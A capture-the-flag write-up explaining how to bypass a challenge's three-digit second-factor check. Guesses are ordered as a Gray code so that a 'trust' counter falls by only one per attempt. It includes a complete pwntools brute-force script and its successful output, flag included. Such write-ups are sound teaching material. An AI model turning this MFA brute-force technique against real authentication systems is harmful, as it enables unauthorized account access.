# Grey's Anatomy

Author: BenderBot

## Description

Can you compromise the medical records of Seattle Grace Hospital? We've obtained a set of credentials (mgrey/1515) but haven't figured out how to bypass the second factor authentication.

## Solution

tl;dr:

Use gray codes to only deduct the trust by 1 for each guess allowing for bruteforce.

---

Connecting and logging into the service requires the credintials provided in the description. Once logged in, the user will be prompted for a 3 digit code. Sending the 2 codes `123` and `124` result in a trust decrease of 3 as shown below.

```
Enter Code #1 (Trust: 1000):
123
Incorrect Code, please re-enter
Enter Code #1 (Trust: 1000):
124
Incorrect Code, please re-enter
Enter Code #1 (Trust: 997):
```

Looking into this deduction further it can be seen that it is the count of 1's in the binary result of `123 ^ 124` as shown below.

```
>>> bin(123 ^ 124)
'0b111'
```

Looking for a sequence of integers where adjacent numbers only differ by one bit results in finding the "gray code" sequence. The numbers in this sequence will only appear once and will only differ by 1 bit.

```
120 => 0b1111000
121 => 0b1111001
123 => 0b1111011
122 => 0b1111010
126 => 0b1111110
127 => 0b1111111
125 => 0b1111101
124 => 0b1111100
116 => 0b1110100
```

Submitting this sequence in order will result in the trust only decreasing by 1.

```
Enter Code #1 (Trust: 1000):
120
Incorrect Code, please re-enter
Enter Code #1 (Trust: 1000):
121
Incorrect Code, please re-enter
Enter Code #1 (Trust: 999):
123
Incorrect Code, please re-enter
Enter Code #1 (Trust: 998):
122
Incorrect Code, please re-enter
Enter Code #1 (Trust: 997):
126
Incorrect Code, please re-enter
Enter Code #1 (Trust: 996):
127
Incorrect Code, please re-enter
Enter Code #1 (Trust: 995):
125
Incorrect Code, please re-enter
Enter Code #1 (Trust: 994):
124
Incorrect Code, please re-enter
Enter Code #1 (Trust: 993):
116
Incorrect Code, please re-enter
Enter Code #1 (Trust: 992):
```

Scripting this process allows for a successful bruteforce.

```
[+] Opening connection to 0.cloud.chals.io on port 11444: Done
[*] Success: Code #1 found
[*] Success: Code #2 found
[*] Success: Code #3 found
[*] Success: Code #4 found
[*] Success: Code #5 found
[*] Success: Code #6 found
[*] Success: Code #7 found
[*] Success: Code #8 found
[*] Success: Code #9 found
[*] Success: Code #10 found
[*] Success: Code #11 found
[*] Success: Code #12 found
[*] Success: Code #13 found
[*] Success: Code #14 found
[*] Success: Code #15 found
[*] Switching to interactive mode
You have successfully authenticated!
FLAG: uscg{Gr4y_c0d3S}

[*] Got EOF while reading in interactive
```

---

```python
from pwn import *

p = remote('0.cloud.chals.io',11444)

def login():
    p.recvuntil(b'Username: ')
    p.sendline(b'mgrey')
    p.recvuntil(b'Password: ')
    p.sendline(b'1515')

def generate_codes():
    codes = []

    for i in range(1024):
        code = (i ^ (i >> 1))

        if code < 1000:
            codes.append(str(code).zfill(3).encode('utf-8'))
    
    return codes

def brute_code(codes):
    for code in codes:
        p.recvuntil(b'): \n')
        p.sendline(code)
        r = p.recvline()

        if b'Incorrect' not in r:
            return

def main():
    codes = generate_codes()
    login()

    passes = 0
    while passes < 15:
        brute_code(codes)
        passes += 1

        log.info(f"Success: Code #{passes} found")
    
    p.interactive()

main()
```

